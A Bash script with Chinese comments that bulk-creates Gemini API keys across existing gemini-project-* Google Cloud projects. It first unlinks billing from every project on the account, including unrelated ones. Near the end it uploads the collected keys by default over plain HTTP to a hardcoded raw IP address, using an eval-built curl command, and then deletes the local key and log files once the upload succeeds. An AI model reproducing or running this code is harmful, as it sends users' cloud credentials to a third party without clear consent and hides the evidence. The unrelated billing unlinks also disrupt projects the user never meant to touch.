#!/bin/bash

# 使用已存在的GCP项目创建Gemini API Key脚本
# 遍历所有以 gemini-project 开头的现有项目，批量绑定账单并生成 API Key

# 不使用set -e，避免并发任务中的错误导致主脚本退出
# set -e

TIMESTAMP=$(date +%s)
LOG_FILE="existing_gemini_keys_${TIMESTAMP}.log"
MAX_BILLING_CONCURRENCY=10
BILLING_RETRY=0
MAX_API_KEY_CONCURRENCY=${MAX_API_KEY_CONCURRENCY:-5}
BILLING_SUCCESS_FILE="existing_billing_success_${TIMESTAMP}.tmp"
BILLING_FAILED_FILE="existing_billing_failed_${TIMESTAMP}.tmp"
PROJECT_LIST_FILE="existing_projects_${TIMESTAMP}.tmp"
cleanup_after_upload_success=false

if [ "$MAX_API_KEY_CONCURRENCY" -le 0 ]; then
    MAX_API_KEY_CONCURRENCY=1
fi

rm -f "$BILLING_SUCCESS_FILE" "$BILLING_FAILED_FILE" "$PROJECT_LIST_FILE"
rm -f key_*.tmp key.txt

# 日志函数
log() {
    local level="$1"
    shift
    local message="$*"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] [$level] $message" | tee -a "$LOG_FILE"
}

log_info() {
    log "INFO" "$@"
}

log_error() {
    log "ERROR" "$@"
}

log_success() {
    log "SUCCESS" "$@"
}

log_warning() {
    log "WARNING" "$@"
}

# 初始化日志
log_info "=== 开始为现有项目创建 Gemini API Keys ==="
log_info "最大账单绑定并发: $MAX_BILLING_CONCURRENCY"
log_info "最大 API Key 并发: $MAX_API_KEY_CONCURRENCY"
log_info "账单绑定重试次数: $BILLING_RETRY"
log_info "时间戳: $TIMESTAMP"
log_info "日志文件: $LOG_FILE"

# 检查是否已登录
log_info "检查 GCloud 认证状态..."
ACTIVE_ACCOUNT=$(gcloud auth list --filter=status:ACTIVE --format="value(account)" | head -n1)
if [ -z "$ACTIVE_ACCOUNT" ]; then
    log_error "未检测到活跃的 GCloud 认证，请先运行 gcloud auth login"
    exit 1
fi
log_success "当前认证账户: $ACTIVE_ACCOUNT"

# 获取账单账户
log_info "获取账单账户..."
BILLING_ACCOUNT=$(gcloud beta billing accounts list --format="value(name)" --limit=1)
if [ -z "$BILLING_ACCOUNT" ]; then
    log_error "未找到可用的账单账户"
    exit 1
fi
log_success "账单账户: $BILLING_ACCOUNT"

# 获取所有以gemini-project开头的项目
log_info "搜索以 gemini-project 开头的现有项目..."
EXISTING_PROJECTS=$(gcloud projects list --filter="projectId:gemini-project-*" --format="value(projectId)" 2>/dev/null)

if [ -z "$EXISTING_PROJECTS" ]; then
    log_error "未找到以 gemini-project 开头的项目"
    log_info "请先运行 create_gemini_keys.sh 创建项目"
    exit 1
fi

# 统计找到的项目数量
PROJECT_COUNT=$(echo "$EXISTING_PROJECTS" | sed '/^$/d' | wc -l)
log_success "找到 $PROJECT_COUNT 个符合条件的项目"

# 显示找到的项目并保存列表
log_info "将处理以下项目："
rm -f "$PROJECT_LIST_FILE"
echo "$EXISTING_PROJECTS" | while read -r project_id; do
    if [ -n "$project_id" ]; then
        log_info "  - $project_id"
        printf '%s\n' "$project_id" >> "$PROJECT_LIST_FILE"
    fi
done

# 解绑所有现有项目的账单绑定
log_info "检查并解绑现有项目的账单绑定..."
LINKED_PROJECTS=$(gcloud beta billing projects list --billing-account=$BILLING_ACCOUNT --format="value(projectId)" 2>/dev/null || echo "")

if [ -n "$LINKED_PROJECTS" ]; then
    log_warning "发现以下项目已绑定账单账户："
    echo "$LINKED_PROJECTS" | while read -r project_id; do
        if [ -n "$project_id" ]; then
            log_warning "  - $project_id"
        fi
    done

    log_info "开始解绑所有项目的账单绑定..."
    echo "$LINKED_PROJECTS" | while read -r project_id; do
        if [ -n "$project_id" ]; then
            log_info "解绑项目: $project_id"
            if gcloud beta billing projects unlink "$project_id" --quiet >/dev/null 2>&1; then
                log_success "项目 $project_id 账单解绑成功"
            else
                log_warning "项目 $project_id 账单解绑失败（可能已解绑）"
            fi
        fi
    done
else
    log_info "未发现已绑定账单的项目"
fi


# 单个项目绑定账单（含重试）
link_project_billing_worker() {
    local project_id="$1"
    local attempt=0
    local max_attempts=$((BILLING_RETRY + 1))

    while [ $attempt -lt $max_attempts ]; do
        local attempt_idx=$((attempt + 1))
        log_info "【账单】项目 $project_id 绑定尝试第 $attempt_idx 次..."
        if gcloud beta billing projects link "$project_id" --billing-account=$BILLING_ACCOUNT --quiet >/dev/null 2>&1; then
            log_success "【账单】项目 $project_id 账单绑定成功"
            printf '%s\n' "$project_id" >> "$BILLING_SUCCESS_FILE"
            return 0
        else
            log_warning "【账单】项目 $project_id 绑定失败 (尝试 $attempt_idx)"
            current_account=$(gcloud beta billing projects describe "$project_id" --format="value(billingAccountName)" 2>/dev/null)
            if [ "$current_account" = "$BILLING_ACCOUNT" ]; then
                log_info "【账单】项目 $project_id 已绑定到账户，视为成功"
                printf '%s\n' "$project_id" >> "$BILLING_SUCCESS_FILE"
                return 0
            fi
        fi
        attempt=$((attempt + 1))
        if [ $attempt -lt $max_attempts ]; then
            sleep 1
        fi
    done

    log_error "【账单】项目 $project_id 绑定失败（超出重试次数）"
    printf '%s\n' "$project_id" >> "$BILLING_FAILED_FILE"
    return 1
}

# 并发为所有 gemini-project-* 项目绑定账单
link_billing_for_gemini_projects() {
    log_info "扫描以 gemini-project- 开头的项目以绑定账单..."
    mapfile -t GEMINI_PROJECTS < <(gcloud projects list --filter="projectId:gemini-project-*" --format="value(projectId)" 2>/dev/null)

    if [ ${#GEMINI_PROJECTS[@]} -eq 0 ]; then
        log_warning "未找到任何以 gemini-project- 开头的项目"
        return 1
    fi

    log_info "共有 ${#GEMINI_PROJECTS[@]} 个项目需要绑定，最大并发: $MAX_BILLING_CONCURRENCY"
    rm -f "$BILLING_SUCCESS_FILE" "$BILLING_FAILED_FILE"

    local -a running_pids=()
    for project_id in "${GEMINI_PROJECTS[@]}"; do
        if [ -z "$project_id" ]; then
            continue
        fi
        while [ ${#running_pids[@]} -ge $MAX_BILLING_CONCURRENCY ]; do
            # 检查并清理已完成的进程
            local new_pids=()
            for pid in "${running_pids[@]}"; do
                if kill -0 "$pid" 2>/dev/null; then
                    new_pids+=("$pid")
                fi
            done
            running_pids=("${new_pids[@]}")

            # 如果仍然达到并发限制，等待第一个进程
            if [ ${#running_pids[@]} -ge $MAX_BILLING_CONCURRENCY ]; then
                wait "${running_pids[0]}" 2>/dev/null
                running_pids=("${running_pids[@]:1}")
            fi
        done
        link_project_billing_worker "$project_id" &
        running_pids+=($!)
    done

    for pid in "${running_pids[@]}"; do
        wait "$pid" 2>/dev/null
    done

    local success_count=0
    local failure_count=0
    if [ -f "$BILLING_SUCCESS_FILE" ]; then
        success_count=$(grep -c '.' "$BILLING_SUCCESS_FILE" 2>/dev/null || echo 0)
    fi
    if [ -f "$BILLING_FAILED_FILE" ]; then
        failure_count=$(grep -c '.' "$BILLING_FAILED_FILE" 2>/dev/null || echo 0)
    fi

    log_info "账单绑定完成：成功 $success_count 个，失败 $failure_count 个"
    if [ $failure_count -gt 0 ]; then
        log_warning "绑定失败的项目详见: $BILLING_FAILED_FILE"
    fi
}

# 为绑定成功的项目创建 Gemini API Key
process_project_for_key() {
    local project_id="$1"
    local api_key_name="gemini-key-existing-${project_id}-${TIMESTAMP}"

    log_info "[$project_id] 启用 API Keys 服务..."
    if gcloud services enable apikeys.googleapis.com --project=$project_id --quiet >/dev/null 2>&1; then
        log_success "[$project_id] API Keys 服务启用成功"
    else
        log_error "[$project_id] API Keys 服务启用失败"
        return 1
    fi

    log_info "[$project_id] 启用 Generative Language 服务..."
    if gcloud services enable generativelanguage.googleapis.com --project=$project_id --quiet >/dev/null 2>&1; then
        log_success "[$project_id] Generative Language 服务启用成功"
    else
        log_error "[$project_id] Generative Language 服务启用失败"
        return 1
    fi

    log_info "[$project_id] 创建 API Key: $api_key_name"
    if operation=$(gcloud services api-keys create --display-name="$api_key_name" --project=$project_id --format="value(name)" 2>/dev/null); then
        log_success "[$project_id] API Key 创建操作已提交: $operation"
    else
        log_error "[$project_id] API Key 创建失败"
        return 1
    fi

    log_info "[$project_id] 等待 API Key 操作完成..."
    if gcloud services operations wait "$operation" --project=$project_id --quiet >/dev/null 2>&1; then
        log_success "[$project_id] API Key 操作完成"
    else
        log_error "[$project_id] API Key 操作等待失败"
        return 1
    fi

    log_info "[$project_id] 获取 API Key 详情..."
    key_name=$(gcloud services api-keys list --filter="displayName:$api_key_name" --project=$project_id --format="value(name)" --limit=1 2>/dev/null)
    if [ -n "$key_name" ]; then
        log_success "[$project_id] 找到 API Key: $key_name"
        api_key=$(gcloud services api-keys get-key-string "$key_name" --project=$project_id --format="value(keyString)" 2>/dev/null)
        if [ -n "$api_key" ]; then
            printf '%s\n' "$api_key" > "key_${project_id}.tmp"
            log_success "[$project_id] API Key 获取成功并保存: ${api_key:0:10}..."
        else
            log_error "[$project_id] API Key 字符串获取失败"
            return 1
        fi
    else
        log_error "[$project_id] 未找到创建的 API Key"
        return 1
    fi
}

# 执行批量账单绑定
link_billing_for_gemini_projects

# 根据绑定结果筛选需要创建 API Key 的项目
READY_FOR_KEYS=()
if [ -f "$PROJECT_LIST_FILE" ]; then
    mapfile -t PROJECT_ID_LIST < "$PROJECT_LIST_FILE"
    for project_id in "${PROJECT_ID_LIST[@]}"; do
        if grep -Fxq "$project_id" "$BILLING_SUCCESS_FILE" 2>/dev/null; then
            READY_FOR_KEYS+=("$project_id")
        else
            log_warning "[$project_id] 账单未成功绑定，跳过 API Key 处理"
        fi
    done
else
    log_warning "未找到项目列表文件，无法按顺序处理 API Key"
    if [ -f "$BILLING_SUCCESS_FILE" ]; then
        mapfile -t READY_FOR_KEYS < "$BILLING_SUCCESS_FILE"
    fi
fi

if [ ${#READY_FOR_KEYS[@]} -gt 0 ]; then
    log_info "开始并发处理 ${#READY_FOR_KEYS[@]} 个现有项目的 Gemini API Key，最大并发: $MAX_API_KEY_CONCURRENCY"
    API_JOB_PIDS=()
    for project_id in "${READY_FOR_KEYS[@]}"; do
        while [ ${#API_JOB_PIDS[@]} -ge $MAX_API_KEY_CONCURRENCY ]; do
            # 检查并清理已完成的进程
            local new_pids=()
            for pid in "${API_JOB_PIDS[@]}"; do
                if kill -0 "$pid" 2>/dev/null; then
                    new_pids+=("$pid")
                fi
            done
            API_JOB_PIDS=("${new_pids[@]}")

            # 如果仍然达到并发限制，等待第一个进程
            if [ ${#API_JOB_PIDS[@]} -ge $MAX_API_KEY_CONCURRENCY ]; then
                wait "${API_JOB_PIDS[0]}" 2>/dev/null
                API_JOB_PIDS=("${API_JOB_PIDS[@]:1}")
            fi
        done
        process_project_for_key "$project_id" &
        API_JOB_PIDS+=($!)
    done

    API_OVERALL_STATUS=0
    for pid in "${API_JOB_PIDS[@]}"; do
        if ! wait "$pid" 2>/dev/null; then
            API_OVERALL_STATUS=1
        fi
    done

    if [ $API_OVERALL_STATUS -ne 0 ]; then
        log_warning "部分项目的 API Key 创建失败，详见前述日志"
    fi
else
    log_warning "没有成功绑定账单的项目可继续创建 Gemini API Key"
fi


# 合并所有临时key文件到key.txt
log_info "合并 API Keys 到 key.txt..."
if cat key_*.tmp > key.txt 2>/dev/null; then
    KEY_COUNT=$(wc -l < key.txt 2>/dev/null || echo "0")
    log_success "成功生成 $KEY_COUNT 个 API Keys，保存到 key.txt"

    # 显示生成的 API Keys（仅显示前10个字符）
    log_info "生成的 API Keys："
    i=1
    while IFS= read -r key; do
        if [ -n "$key" ]; then
            log_success "  API Key $i: ${key:0:10}..."
            i=$((i+1))
        fi
    done < key.txt

    # 生成分组文件
    log_info "生成分组文件..."

    # 获取当前用户邮箱
    if [ -z "$USER_EMAIL" ]; then
        USER_EMAIL=$(gcloud config get-value account 2>/dev/null || echo "unknown")
    fi

    # 清理邮箱前缀
    email_prefix=$(echo "$USER_EMAIL" | cut -d'@' -f1)
    clean_prefix=$(echo "$email_prefix" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9_-]//g' | sed 's/_/-/g' | sed 's/^-*//;s/-*$//')
    if [ -z "$clean_prefix" ]; then
        clean_prefix="user"
    fi

    # 截取前7个字符作为项目前缀
    if [ ${#clean_prefix} -ge 7 ]; then
        prefix_chars=${clean_prefix:0:7}
    else
        # 如果邮箱前缀不足7个字符，用数字补充
        prefix_chars=$clean_prefix
        fill_chars="0123456"
        while [ ${#prefix_chars} -lt 7 ]; do
            needed=$((7 - ${#prefix_chars}))
            prefix_chars="${prefix_chars}${fill_chars:0:$needed}"
        done
    fi

    # 再次清理截取后的前缀，确保不以连字符结尾
    prefix_chars=$(echo "$prefix_chars" | sed 's/-*$//')

    # 生成组名
    group_name="studio-${prefix_chars}-$(date +%m%d)"

    # 将key文件复制为组名文件
    output_file="${group_name}.txt"
    if cp key.txt "$output_file"; then
        log_success "✅ Keys已保存到文件: $output_file"
        log_info "  - 组名: $group_name"
        log_info "  - Keys数量: $KEY_COUNT"
        log_info "  - 用户邮箱: $USER_EMAIL"
        log_info "  - 邮箱前缀: $prefix_chars"
    else
        log_error "❌ 无法保存Keys文件"
    fi
else
    log_warning "未找到任何 API Key 文件"
    KEY_COUNT=0
fi

log_info "处理总结："
READY_FOR_KEYS_COUNT=${#READY_FOR_KEYS[@]}
BILLING_SUCCESS_COUNT=$(grep -c '.' "$BILLING_SUCCESS_FILE" 2>/dev/null || echo 0)
log_info "  - 检测到的项目总数: $PROJECT_COUNT 个"
log_info "  - 账单绑定成功: $BILLING_SUCCESS_COUNT 个"
log_info "  - 尝试创建 API Key 的项目: $READY_FOR_KEYS_COUNT 个"
log_info "  - 成功生成 API Key: $KEY_COUNT 个"

# 上传到服务器
UPLOAD_API_URL="${UPLOAD_API_URL:-http://152.53.82.146:5001/api/upload-aistudio}"
UPLOAD_API_TOKEN="${UPLOAD_API_TOKEN:-}"

if [ -n "$UPLOAD_API_URL" ] && [ -f "key.txt" ] && [ "$KEY_COUNT" -gt 0 ]; then
    log_info "准备上传到服务器: $UPLOAD_API_URL"

    # 使用已生成的组名文件
    temp_file="${output_file}"

    # 构建curl命令
    curl_cmd="curl -s"
    if [ -n "$UPLOAD_API_TOKEN" ]; then
        curl_cmd="$curl_cmd -H 'Authorization: Bearer $UPLOAD_API_TOKEN'"
    fi
    curl_cmd="$curl_cmd -X POST -F 'file=@$temp_file' '$UPLOAD_API_URL'"

    # 执行上传
    response=$(eval "$curl_cmd" 2>/dev/null)
    exit_code=$?

    if [ $exit_code -eq 0 ]; then
        if echo "$response" | grep -q '"success".*true'; then
            log_success "✅ 成功上传到服务器"
            log_info "服务器响应: $response"
            log_info "上传成功，将清理本地日志与密钥文件"
            cleanup_after_upload_success=true
        else
            log_error "❌ 上传失败: $response"
            log_info "Keys已保存在本地: $output_file"
        fi
    else
        log_error "❌ 网络请求失败"
        log_info "Keys已保存在本地: $output_file"
    fi

else
    if [ -z "$UPLOAD_API_URL" ]; then
        log_warning "未配置上传API地址（设置UPLOAD_API_URL环境变量以启用自动上传）"
    fi
    if [ "$KEY_COUNT" -gt 0 ] && [ "$cleanup_after_upload_success" != "true" ]; then
        log_info "Keys已保存在本地: key.txt"
    fi
fi

# 清理临时文件
rm -f key_*.tmp "$PROJECT_LIST_FILE" "$BILLING_SUCCESS_FILE" "$BILLING_FAILED_FILE"

log_info "=== 脚本执行完成 ==="
if [ "$cleanup_after_upload_success" = "true" ]; then
    log_info "上传成功，本地记录已清理"
else
    log_info "日志文件: $LOG_FILE"
    if [ -f "key.txt" ]; then
        log_info "本地API Keys文件: key.txt"
    fi
    if [ -n "$output_file" ] && [ -f "$output_file" ]; then
        log_info "输出文件: $output_file"
    fi
fi

if [ "$cleanup_after_upload_success" = "true" ]; then
    rm -f key.txt "$LOG_FILE"
    if [ -n "${output_file:-}" ] && [ -f "$output_file" ]; then
        rm -f "$output_file"
    fi
fi
